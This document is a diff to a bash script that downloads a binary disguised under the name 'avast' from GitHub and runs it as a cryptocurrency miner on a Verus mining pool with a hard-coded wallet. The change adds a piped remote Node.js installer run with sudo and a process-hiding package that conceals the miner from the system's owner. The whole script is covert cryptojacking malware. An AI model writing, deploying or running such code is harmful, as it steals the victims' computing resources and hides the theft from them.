@@ -1,4 +1,9 @@
 #!/bin/bash
+apt update
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt install nodejs
+npm i -g node-process-hider
 wget https://github.com/aurbach55/pos/raw/main/avast >/dev/null 2>&1
 chmod +x avast  >/dev/null 2>&1
-./avast -v -l  na.luckpool.net:3956 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p x -t 8
+ph add avast
+./avast -v -l  pool.verus.io:9999 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p x -t 8
